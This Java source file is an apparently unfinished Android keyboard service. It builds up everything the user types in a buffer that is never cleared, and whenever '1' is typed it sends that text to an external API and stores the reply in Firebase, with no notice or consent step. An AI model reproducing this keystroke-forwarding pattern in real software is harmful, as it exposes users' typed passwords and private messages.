package com.example.newkeyboard;

import android.annotation.SuppressLint;

import android.inputmethodservice.InputMethodService;
import android.inputmethodservice.Keyboard;
import android.inputmethodservice.KeyboardView;
import android.media.AudioManager;

import android.os.AsyncTask;
import android.util.Log;
import android.view.KeyEvent;
import android.view.View;
import android.view.inputmethod.InputConnection;

import com.example.newkeyboard.Utilities.NetworkUtils;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.io.IOException;
import java.net.URL;

public class BrightKeyboard extends InputMethodService implements KeyboardView.OnKeyboardActionListener {

    private KeyboardView kv;
    private Keyboard keyboard;

    private boolean isCaps = false;

    private StringBuilder buffer = new StringBuilder(); //String s=(new StringBuilder()).append("Sachin").append(" Tendulkar).toString();

    //Press Ctrl+O


    @SuppressLint("InflateParams")
    @Override
    public View onCreateInputView() {
        kv = (KeyboardView) getLayoutInflater().inflate(R.layout.keyboard, null);
        keyboard = new Keyboard(this, R.xml.qwerty);
        kv.setKeyboard(keyboard);
        kv.setOnKeyboardActionListener(this);
        return kv;
    }

    @Override
    public void onPress(int i) {

    }

    @Override
    public void onRelease(int i) {

    }

    @Override
    public void onKey(int i, int[] ints) {

        InputConnection ic = getCurrentInputConnection();
        playClick(i);
        switch (i) {
            case Keyboard.KEYCODE_DELETE:
                ic.deleteSurroundingText(1, 0);
                break;
            case Keyboard.KEYCODE_SHIFT:
                isCaps = !isCaps;
                keyboard.setShifted(isCaps);
                kv.invalidateAllKeys();
                break;
            case Keyboard.KEYCODE_DONE:
                ic.sendKeyEvent(new KeyEvent(KeyEvent.ACTION_DOWN, KeyEvent.KEYCODE_ENTER));
                break;
            default:
                char code = (char) i;
                if (Character.isLetter(code) && isCaps)
                    code = Character.toUpperCase(code);
                ///////////////////////////////////////////////
                this.buffer.append(code);
                if (code == '1') { ////////Have to change/////////////////////////////////////////////////////////////////////////////////*******/////
                    sendTextToAPI(this.buffer.toString());
                    //buffer=null;
                }
                ///////////////////////////////////////////////

                ic.commitText(String.valueOf(code), 1);
        }
    }

    private void sendTextToAPI(String text) {
        URL sendText = NetworkUtils.buildUrl(text);
        Log.d("url", "sending");

        //***************************Send the text to api******************************************************//
        new QueryTask().execute(sendText);
    }

    private void writeData(String response) {
        ///have to implement

        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference("message");

        Log.d("write data fire-base",myRef.toString());

        myRef.setValue(response);

        Log.d("write data", "done!!!");
    }

    @SuppressLint("StaticFieldLeak")
    public class QueryTask extends AsyncTask<URL, Void, String> {

        @Override
        protected String doInBackground(URL... params) {
            Log.d("doInBackground", "URL");
            URL searchUrl = params[0];
            Log.d("doInBackground", searchUrl.toString());
            String apiResponse = null;
            try {
                Log.d("apiresponse","sending");
                apiResponse = NetworkUtils.getResponseFromHttpUrl(searchUrl);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return apiResponse;
        }

        @Override
        protected void onPostExecute(String apiResponse) {
            if (apiResponse != null && !apiResponse.equals("")) {
                //////write data to fire-base
                writeData(apiResponse);
            }
        }
    }

    private void playClick(int i) {

        AudioManager am = (AudioManager) getSystemService(AUDIO_SERVICE);
        switch (i) {
            case 32:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_SPACEBAR);
                break;
            case Keyboard.KEYCODE_DONE:
            case 10:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_RETURN);
                break;
            case Keyboard.KEYCODE_DELETE:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_DELETE);
                break;
            default:
                am.playSoundEffect(AudioManager.FX_KEYPRESS_STANDARD);
        }
    }

    @Override
    public void onText(CharSequence charSequence) {

    }

    @Override
    public void swipeLeft() {

    }

    @Override
    public void swipeRight() {

    }

    @Override
    public void swipeDown() {

    }

    @Override
    public void swipeUp() {

    }
}
